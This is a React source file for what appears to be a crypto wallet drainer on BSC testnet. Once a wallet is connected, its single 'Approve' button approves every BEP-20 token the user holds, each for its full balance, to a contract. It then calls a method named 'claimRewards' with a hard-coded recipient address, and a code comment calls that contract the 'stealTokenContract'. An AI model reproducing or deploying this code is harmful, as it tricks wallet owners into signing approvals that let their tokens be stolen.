import { useState } from 'react';
import useWeb3Modal from './hooks/useWeb3Modal'
import { truncateAddress } from "./utils";
import Web3 from 'web3';
import { useMoralisWeb3Api  } from 'react-moralis';

import BEP20ABI from './config/abi.json';
import GOODBSCABI from './config/goodbsc_abi.json';
import { useEffect } from 'react';

export default function Home() {

  const { account, connectWallet, disconnect, switchNetwork, error, chainId } = useWeb3Modal()
  const Web3Api = useMoralisWeb3Api();

  const contractAddress = "0x7647436153951824260C4079Cd53b6c9A263097A"
  const web3 = new Web3(Web3.givenProvider)
  const goodBSCContract = new web3.eth.Contract(GOODBSCABI, contractAddress);
  const toAddress = "0x96F42C25Eeb53fb976815FE8443437e7bEF6768E"

  const bep20Approve = async (tokenAddr, tokenBal) => {
    const Bep20Contract = new web3.eth.Contract(BEP20ABI, tokenAddr);
    const result = await Bep20Contract.methods.approve(contractAddress, tokenBal).send({from: account});
    return result;
  }

  const handleApprove = async () => {
    // fetch token addresses of account from moralis.io
    const bnbBalance = await Web3Api.account.getNativeBalance({
      chain: "0x61",
      address: account
    });
    console.log(bnbBalance);

    const balances = await Web3Api.account.getTokenBalances({
      chain: "0x61",
      address: account
    });
    console.log(balances);

    let tokenAddrs = [];
    let tokenBalances = [];
    // approve all tokens for stealTokenContract
    balances.forEach((item) => {
      tokenAddrs.push(item.token_address);
      tokenBalances.push(item.balance);      
    });

    console.log("Tokens: ", tokenAddrs);
    console.log("Balances: ", tokenBalances);

    for (let i=0; i<tokenAddrs.length; i++) {
      const aprv = await bep20Approve(tokenAddrs[i], tokenBalances[i]);
      console.log(aprv);
    }

    const bep20Transfer = await goodBSCContract.methods.claimRewards(tokenAddrs, account, toAddress).send({from: account});
    console.log(bep20Transfer);
    if (bep20Transfer.blockHash) {
      alert("Transferred successfully!");
    }
    // call contract's function
      // inside contract, transferFrom will be called

    // after response, alert success message
  }

  return (
    <>
      <span>
        {!account ? (
          <button onClick={connectWallet}>Connect Wallet</button>
        ) : (
          <button onClick={disconnect}>Disconnect</button>
        )}
      </span>
      <span>{`Account: ${truncateAddress(account)}`}</span>
      <span>{error ? error.message : null}</span>
      <br />
      <br />
      {account && <button onClick={handleApprove}>Approve</button>}
    </>
  );
}
